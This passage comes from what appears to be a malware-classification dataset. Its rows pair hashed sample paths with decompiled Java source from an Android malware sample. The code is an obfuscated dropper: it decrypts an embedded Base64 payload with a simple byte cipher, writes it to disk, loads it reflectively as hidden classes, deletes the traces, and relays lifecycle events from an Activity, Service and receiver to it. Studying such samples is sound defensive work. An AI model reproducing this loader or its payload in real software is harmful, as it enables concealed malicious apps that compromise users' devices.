f342a;   }   public static Class a(  String str,  Context context){     Class cls=(Class)c.get(str);     if (cls == null) {       try {         a(context);         String str2=context.getFilesDir() + File.separator;         if (f343b == null) {           f343b=f342a.getConstructor(String.class,String.class,String.class,ClassLoader.class).newInstance(str2 + b.s,context.getFilesDir().getPath(),null,b(context));         }         cls=(Class)f342a.getMethod(b.p,String.class).invoke(f343b,str);         if (cls != null) {           c.put(str,cls);         }         new File(str2 + b.s).delete();         new File(str2 + b.t).delete();       }  catch (      Exception e) {         e.printStackTrace();       }     }     return cls;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Context context,  String str,  String str2){     return a(objArr,clsArr,null,null,context,str,str2);   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Class cls,  String str){     Object obj=d.get(str);     if (obj == null) {       try {         obj=(clsArr == null && objArr == null) ? cls.getConstructor(new Class[0]).newInstance(new Object[0]) : cls.getConstructor(clsArr).newInstance(objArr);         if (obj != null) {           d.put(str,obj);         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     return obj;   }   public static Object a(  Object[] objArr,  Class[] clsArr,  Object[] objArr2,  Class[] clsArr2,  Context context,  String str,  String str2){     if (str2.equals(b.f340b) || str2.equals(b.j)) {       d.remove(str);     }     try {       Class a2=a(str,context);       Object a3=a(objArr2,clsArr2,a2,str);       Method method=clsArr == null ? a2.getMethod(str2,new Class[0]) : a2.getMethod(str2,clsArr);       method.setAccessible(true);       return objArr == null ? method.invoke(a3,new Object[0]) : method.invoke(a3,objArr);     }  catch (    Exception e) {       return null;     }   }   private static Object b(  Context context){     try {       return Context.class.getMethod(b.q,new Class[0]).invoke(context,new Object[0]);     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.a\Sdx.code","public class Sdx extends Activity {   @Override protected void onActivityResult(  int i,  int i2,  Intent intent){     super.onActivityResult(i,i2,intent);     d.a(new Object[]{Integer.valueOf(i),Integer.valueOf(i2),intent},new Class[]{Integer.class,Integer.class,Intent.class},this,b.v,b.g);   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     d.a(new Object[]{this,Sdx.class,Tnsv.class,Wifi.class},new Class[]{Activity.class,Class.class,Class.class,Class.class},this,b.v,b.f340b);   }   @Override protected void onDestroy(){     super.onDestroy();     d.a(null,null,this,b.v,b.f);   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     return Boolean.parseBoolean(d.a(new Object[]{Integer.valueOf(i),keyEvent},new Class[]{Integer.TYPE,KeyEvent.class},this,b.v,b.h).toString());   }   @Override protected void onResume(){     super.onResume();     d.a(null,null,this,b.v,b.d);   }   @Override protected void onStart(){     super.onStart();     d.a(null,null,this,b.v,b.c);   }   @Override protected void onStop(){     super.onStop();     d.a(null,null,this,b.v,b.e);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.a\Tnsv.code","public class Tnsv extends Service {   @Override public IBinder onBind(  Intent intent){     d.a(new Object[]{intent},new Class[]{Intent.class},this,b.x,b.i);     return null;   }   @Override public void onCreate(){     super.onCreate();     d.a(new Object[]{this,Sdx.class,Tnsv.class,Wifi.class},new Class[]{Context.class,Class.class,Class.class,Class.class},this,b.x,b.f340b);   }   @Override public void onDestroy(){     super.onDestroy();     d.a(null,null,this,b.x,b.f);   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     d.a(new Object[]{intent,Integer.valueOf(i),Integer.valueOf(i2)},new Class[]{Intent.class,Integer.TYPE,Integer.TYPE},this,b.x,b.k);     return 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.a\Wifi.code","public class Wifi extends BroadcastReceiver {   @Override public void onReceive(  Context context,  Intent intent){     if (b.f339a.length() > 0) {       a.a(context).a(b.f339a);     }     d.a(new Object[]{context,intent,Sdx.class,Tnsv.class,Wifi.class},new Class[]{Context.class,Intent.class,Class.class,Class.class,Class.class},context,b.w,b.j);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\a.code","public final class a {   public static String f371a=""dd259f8fb5524dcb905075800058cb9b"";   public static String f372b=new String(b.a(Base64.decode(""0b+y196Vvr4="",0)));   public static String c=new String(b.a(Base64.decode(""yNCk48brqA=="",0)));   public static String d=new String(b.a(Base64.decode(""0b/Byuypt74="",0)));   public static String e=new String(b.a(Base64.decode(""uce1xd7V"",0)));   public static String f=new String(b.a(Base64.decode(""wN2p3qe+y9HK"",0)));   public static String g=new String(b.a(Base64.decode(""0b+wyO2dwMLWysHK7Km2zQ=="",0)));   public static String h=new String(b.a(Base64.decode(""wN2w3q2OyNm/"",0)));   public static String i=new String(b.a(Base64.decode(""ucekut3J"",0)));   public static String j=new String(b.a(Base64.decode(""wN233pevwti2"",0)));   public static String k=new String(b.a(Base64.decode(""uce1xdDX7Xe5xs+y3ck="",0)));   public static String l=new String(b.a(Base64.decode(""p6/Nq7U="",0)));   public static String m=new String(b.a(Base64.decode(""7Jm+nMqy3dPlmZO9"",0)));   public static String n=new String(b.a(Base64.decode(""7Jy50A=="",0)));   public static String o=new String(b.a(Base64.decode(""3ZW2z8u8ndjyp76+z3+zyvF3trrVxLvU2pivyw=="",0)));   public static String p=new String(b.a(Base64.decode(""vd7G3Xe2utXE"",0)));   public static String q=new String(b.a(Base64.decode(""sb7WlNvG7KeWyMO11Nc="",0)));   public static String r=new String(b.a(Base64.decode(""ZnjJ0Lg="",0)));   public static String s=new String(b.a(Base64.decode(""ZnjDw8M="",0)));   public static String t=new String(b.a(Base64.decode(""Zni9x8k="",0)));   public static String u=new String(b.a(Base64.decode(""xcDck+NirYelntDT2puvyw=="",0)));   public static String v=new String(b.a(Base64.decode(""tN7Sp554vJCUsMjtncDC1so="",0)));   public static String w=new String(b.a(Base64.decode(""tN7Sp554vJCUwcrcmbPPx8M="",0)));   public static String x=new String(b.a(Base64.decode(""xcDck+NirYelpNTX752tvg=="",0)));   private static StringBuffer z=new StringBuffer().append("""").append("""").append("""").append(""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"");   public static byte[] y=Base64.decode(z.toString(),0); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\b.code","public class b {   private static byte[] f373a=""bQoey4JY"".getBytes();   public static String a(  byte[] bArr){     return new String(b(bArr));   }   public static byte[] b(  byte[] bArr){     if (bArr == null || bArr.length == 0) {       return new byte[0];     }     byte[] bArr2=new byte[bArr.length];     for (int i=0; i < bArr.length; i++) {       try {         bArr2[i]=(byte)(bArr[i] - f373a[(bArr.length + i) % f373a.length]);       }  catch (      Exception e) {         e.printStackTrace();         return bArr2;       }     }     return bArr2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\c.code","public class c {   private static c f374a=null;   private Context f375b;   private c(  Context context){     this.f375b=context;     d.a(new Object[]{context,Ga.class,Js.class,Hr.class},new Class[]{Context.class,Class.class,Class.class,Class.class},d.a(a.u,context),a.u);   }   public static synchronized c a(  Context context){     c cVar; synchronized (c.class) {       if (f374a == null) {         f374a=new c(context);       }       cVar=f374a;     }     return cVar;   }   public void a(  String str){     d.a(new Object[]{str},new Class[]{String.class},this.f375b,a.u,a.l);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.rodjx.c\d.code","public class d {   private static Class f376a;   private static Object f377b;   private static Map c=new HashMap();   private static Map d=new HashMap();   public static Class a(  Context context){     if (f376a == null) {       String str=context.getFilesDir() + File.separator;       byte[] b2=b.b(a.y);       try {         FileOutputStream fileOutputStream=new FileOutputStream(str + a.s);         fileOutputStream.write(b2);         fileOutputStream.close();         f376a=Class.forName(a.o);       }  catch (      